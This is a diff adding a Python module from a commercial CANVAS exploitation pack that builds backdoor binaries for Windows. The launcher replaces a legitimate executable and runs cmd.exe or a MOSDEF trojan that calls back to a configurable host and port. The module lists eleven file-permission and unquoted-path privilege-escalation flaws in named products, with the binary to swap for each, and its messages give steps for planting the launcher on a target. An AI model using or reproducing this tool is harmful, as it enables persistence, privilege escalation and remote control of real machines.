@@ -1,0 +1,293 @@
+#!/usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+
+if "." not in sys.path:
+  sys.path.append(".")
+
+import os,getopt, binascii
+import socket
+from exploitutils import *
+import canvasengine
+import time
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+
+
+NAME = "d2sec_execwrapper"
+DESCRIPTION = "Generic Local Exploit"
+
+NOTES = """
+This tool permits you to create a backdoor binary according to an original 
+binary to replace. This backdoor executes a MOSDEF Trojan or a cmd.exe and 
+then the original binary. For services you need to restore the original
+binary name and launch services.msc from the SYSTEM cmd.exe to restart the 
+original service.
+
+Usage:
+
+1) If you want to execute a cmd.exe
+python exploits/d2sec_execwrapper/d2sec_execwrapper.py -O use_mosdef:0 -O orig_binary:calc
+
+2) If you want to execute a MOSDEF Trojan
+python exploits/d2sec_execwrapper/d2sec_execwrapper.py -O callback_host:127.0.0.1 -O callback_port:5555 -O use_mosdef:1 -O orig_binary:calc -O mosdef:"c:\\temp\\blaat.exe"
+
+orig_binary is binary to replace. Specify its name with or without 
+.exe extension. At the end, some instructions were specified.
+
+In console mode, to list vulnerabilities with which you can use d2sec_execwrapper:
+python exploits/d2sec_execwrapper/d2sec_execwrapper.py -O list_vuln:1
+"""
+
+DOCUMENTATION={}
+DOCUMENTATION["Notes"] = NOTES
+DOCUMENTATION["Vulnerabilities"] = """
+ 
+===============================================================================
+1. VMware Workstation Path Specification Local Privilege Escalation
+CVE Name: CVE-2007-5618
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5618
+Binary name: C:\program.exe
+Exploit: create program.exe and copy it into C:\\
+===============================================================================
+ 
+===============================================================================
+2. VMware Products Shared Folders Variant Directory Traversal
+CVE Name: CVE-2008-0923
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0923
+Binary name: iexplore.exe for example
+Exploit: create for example iexplore.exe and replace the host one with it
+===============================================================================
+ 
+===============================================================================
+3. IBM Lotus Notes Local Insecure Default Directory Permissions
+CVE Name: CVE-2005-2454
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2454
+Binary name: ntmulti.exe
+Exploit: rename original ntmulti.exe to ntmultib.exe, create ntmulti.exe and 
+         copy it into C:\Program Files\lotus\\notes\\
+===============================================================================
+ 
+===============================================================================
+4. Cisco VPN Client for Windows Local Privilege Escalation
+CVE Name: CVE-2007-4415
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4415
+Binary name: cvpnd.exe
+Exploit: rename original cvpnd.exe to cvpndb.exe, create cvpnd.exe and copy it 
+         into C:\Program Files\Cisco Systems\VPN Client\\
+===============================================================================
+
+===============================================================================
+5. Panda Products Insecure Program File Permissions Local Privilege Escalation 
+CVE Name: Unknown
+CVE Url: Unknown
+Ref.: http://www.securityfocus.com/bid/36897
+Binary name: PavFnSvr.exe
+Exploit: rename original PavFnSvr.exe to PavFnSvrb.exe, create PavFnSvr.exe 
+and copy it into 
+C:\Program Files\Panda Security\Panda Global Protection 2010\PavFnSvr.exe\\
+===============================================================================
+
+===============================================================================
+6. Symantec pcAnywhere Insecure File Permissions Local Privilege Escalation
+CVE Name: Unknown
+CVE Url: Unknown
+Ref.: http://www.ngssecure.com/research/research-overview/Vulnerabilities/Patch-Notifications/SymantecPCAnywhereLocalPrivilegeEscalation.aspx
+Binary name: WinAw32.exe, awrem32.exe, awhost32.exe
+Exploit: for example, rename original WinAw32.exe to WinAw32b.exe, create
+WinAw32.exe and copy it into C:\Program Files\Symantec\pcAnywhere\WinAw32.exe
+===============================================================================
+
+===============================================================================
+7. Symantec LiveUpdate Administrator Insecure File Permissions Local Privilege Escalation
+CVE Name: CVE-2012-0304
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0304
+Ref.: http://www.nessus.org/plugins/index.php?view=single&id=59193
+Binary name: tomcat5.exe
+Exploit: for example, rename original tomcat5.exe to tomcat5b.exe, create
+tomcat5.exe and copy it into C:\Program Files\Symantec\LiveUpdate Administrator\\tomcat\\bin\\
+===============================================================================
+
+===============================================================================
+8. Infotecs products (ViPNet Client\Coordinator, SafeDisk, Personal Firewall) Insecure File Permissions Local Privilege Escalation
+CVE Name: CVE-2013-3496
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3496
+Ref.: http://www.securityfocus.com/archive/1/526649
+Binary name: [product name]
+Exploit: for example, rename original example.exe to exampleb.exe, create
+example.exe and copy it into %Program Files%\Infotecs\\
+===============================================================================
+
+===============================================================================
+9. Panda Endpoint Administration Agent Insecure File Permissions Local Privilege Escalation
+CVE Name: CVE-2016-3943
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3943
+Binary name: [product name]
+Exploit: for example, rename original example.exe to exampleb.exe, create
+example.exe and copy it into %Program Files%\Panda Security\WaAgent\\
+===============================================================================
+
+===============================================================================
+10. ArcServe UDP Unquoted Service Path Privilege Escalation
+CVE Name: Unknown
+CVE Url: Unknown
+Ref.: https://www.exploit-db.com/exploits/40335/
+Binary name: ARCUpdate.exe
+Exploit: for example, rename original ARCUpdate.exe to ARCUpdateb.exe, create
+ARCUpdate.exe and copy it into %Program Files%\Arcserve\Unified Data Protection\Update Manager\\
+===============================================================================
+
+===============================================================================
+11. Apache CouchDB Service Path Insecure File Permissions Local Privilege Escalation
+CVE Name: Unknown
+CVE Url: Unknown
+Ref.: https://www.exploit-db.com/exploits/40865/
+Binary name: nssm.exe
+Exploit: for example, rename original nssm.exe to nssmb.exe, create
+nssm.exe and copy it into C:\CouchDB\\bin\ 
+===============================================================================
+
+
+"""
+
+VERSION="0.2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+affectsList=["Tools"]
+
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.name = NAME
+    self.mosdef = "cmd.exe"
+    self.respath = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
+    self.callback_host = "127.0.0.1"
+    self.callback_port = 5555
+    self.orig_binary = "calc"
+    self.use_mosdef = 0 
+    self.list_vuln = 0
+
+  def getargs(self):
+    self.list_vuln = int(self.argsDict.get("list_vuln", self.list_vuln))
+    self.callback_host = self.argsDict.get("callback_host", self.callback_host)
+    self.callback_port = int(self.argsDict.get("callback_port", self.callback_port))
+    self.orig_binary = self.argsDict.get("orig_binary", self.orig_binary)
+    self.use_mosdef = int(self.argsDict.get("use_mosdef", self.use_mosdef))
+    self.mosdef = self.argsDict.get("mosdef", self.mosdef)
+
+  def gen_trojan(self):
+    self.log("[D2] Building MOSDEF Trojan")
+    t_os = canvasos('WINDOWS')
+    t_os.arch = 'X86'
+    mosdef = os.path.join(self.respath, self.mosdef.split('\\')[-1:][0])
+    try:
+      self.buildmosdeftrojan(self.callback_host, self.callback_port, t_os, universal=True)
+      self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan),mosdef))
+      file(mosdef,"wb").write(self.mosdeftrojan)
+    except Exception, e:
+      self.log(e)
+      return 0
+    return len(self.mosdeftrojan)
+  
+  def str_unicode(self, str):
+    u = ""
+    u += "\x00%s" % chr(len(str))
+    for s in str:
+      u += "\x00" + s
+    return u
+
+  def gen_launcher(self):
+    launcher = os.path.join(self.respath, 'd2sec_execwrapper.exe')
+    obin = "\x00\x04\x00O\x00B\x00I\x00N"
+    dbin = "\x00\x04\x00D\x00B\x00I\x00N"
+    self.log("[D2] Building launcher")
+    if (".exe" in self.orig_binary):      
+      bin = self.orig_binary[:len(self.orig_binary) - 4]
+      bin += "b.exe"
+      self.orig_binary = self.orig_binary[:len(self.orig_binary) - 4]
+    else:
+      bin = self.orig_binary + "b.exe"            
+    obin_u = self.str_unicode(bin)
+    dbin_u = self.str_unicode(self.mosdef)
+    i = open(launcher, "rb")
+    o = open(os.path.join(self.respath, self.orig_binary+'.exe'), "wb")
+    for s in i:
+      if s.find(obin) >= 0:
+        s = s.replace(obin, obin_u)
+      if s.find(dbin) >= 0:
+        s = s.replace(dbin, dbin_u)
+      o.write(s)
+    o.close()
+    i.close()
+    
+  def run(self):
+    self.setInfo("%s (in progress)"%(NAME))
+    self.getargs()
+    self.mosdef = self.mosdef.replace('\a', '\\a')
+    self.mosdef = self.mosdef.replace('\b', '\\b')
+    self.mosdef = self.mosdef.replace('\t', '\\t')
+    self.mosdef = self.mosdef.replace('\n', '\\n')
+    self.mosdef = self.mosdef.replace('\v', '\\v')
+    self.mosdef = self.mosdef.replace('\f', '\\f')
+    self.mosdef = self.mosdef.replace('\r', '\\r')
+    if len(self.orig_binary) == 0:
+      self.log("Specify orig_binary argument")
+      self.setInfo("%s - failed !" % (NAME))
+      return 0
+    if self.use_mosdef == 0:
+      self.mosdef = "cmd.exe"
+    i = 1
+    if self.list_vuln == 1:
+      self.log("[D2] Vulnerabilities list")
+      self.log(DOCUMENTATION["Vulnerabilities"])
+      self.setInfo("%s - done"%(NAME))
+      return 1
+    if self.use_mosdef == 1:
+      i = self.gen_trojan()
+      if not i:
+        self.log("Error MOSDEF Trojan !")
+        self.setInfo("%s - failed"%(NAME))
+        return i
+    self.gen_launcher()
+    if self.use_mosdef == 0:
+      self.log("%s.exe built. See in d2sec_execwrapper/Resources folder." % (self.orig_binary))
+      self.log("Rename %s.exe in %sb.exe on vulnerable box." % (self.orig_binary, self.orig_binary))
+      self.log("And copy your launcher %s.exe in the same folder" % self.orig_binary)
+      self.log("as the original binary.")
+    else:
+      self.log("%s.exe and %s built. See in d2sec_execwrapper/Resources folder." % (self.orig_binary, self.mosdef.split('\\')[-1:][0]))
+      self.log("Rename %s.exe in %sb.exe on vulnerable box." % (self.orig_binary, self.orig_binary))
+      self.log("And copy your launcher %s.exe in the same folder" % self.orig_binary)
+      self.log("as the original binary and your MOSDEF Trojan in %s." % self.mosdef)
+    self.setInfo("%s - done"%(NAME))
+    return 1
+  
+  def usage(self):
+    print "Usage: %s -O options:value\n" % (sys.argv[0])
+    print "with options:"
+    print "  -O callback_host:<ip>"  
+    print "  -O callback_port:<port>"
+    print "  -O use_mosdef:0|1"
+    print "  -O list_vuln:0|1"
+    print "  -O orig_binary:<bin>"
+    print "  -O mosdef:<bin>\n"
+    print NOTES
+    sys.exit(0)
+
+if __name__=="__main__":
+  print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+  app = theexploit()
+  ret=standard_callback_commandline(app)
+  if ret not in [0,1,None]:
+    ret.interact()
